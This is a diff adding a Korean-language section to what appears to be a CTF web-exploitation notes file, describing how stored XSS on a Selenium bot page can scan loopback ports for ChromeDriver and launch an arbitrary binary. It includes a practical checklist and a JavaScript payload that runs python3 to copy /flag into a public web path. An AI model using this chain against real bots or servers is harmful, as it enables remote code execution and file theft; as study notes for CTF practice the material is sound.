@@ -29,6 +29,27 @@ description: >
 time.sleep(8)
 ```
 
+### Stored XSS -> ChromeDriver Loopback RCE
+
+Selenium 기반 bot이 `chromedriver --port=<ephemeral>`를 같은 컨테이너의 loopback에 띄운 상태라면,
+저장형 XSS로 봇이 방문한 페이지에서 `127.0.0.1:<high-port>/status`를 스캔한 뒤
+`POST /session`에 `goog:chromeOptions.binary`와 `args`를 넣어 **임의 바이너리 실행**이 가능하다.
+
+실전 체크리스트:
+- 신고 URL 검증이 외부 도메인을 막으면 `http://127.0.0.1:3000/posts/<id>` 같이 허용 origin으로 신고한다.
+- 스캔은 `32768-60999` 범위를 작은 chunk(예: 64)로 돌리고, 열린 포트들에만 `/session`을 던진다.
+- 첫 번째 열린 포트가 chromedriver가 아닐 수 있으니, 찾은 열린 포트들 여러 개에 같이 시도한다.
+- 회수는 가장 단순하게 `/app/public/<name>.txt` 같은 정적 경로에 결과를 기록하게 만든다.
+
+```javascript
+const body = JSON.stringify({
+  capabilities: { alwaysMatch: { "goog:chromeOptions": {
+    binary: "/usr/bin/python3",
+    args: ["-cimport pathlib;pathlib.Path('/app/public/leak.txt').write_text(open('/flag').read())"]
+  }}}
+});
+```
+
 ### Unquoted Attribute XSS — 공백 금지 규칙
 
 `onerror=PAYLOAD//>`처럼 unquoted attribute에 payload 넣을 때, **공백(space/tab/LF)이 속성값을 종료**시킨다.
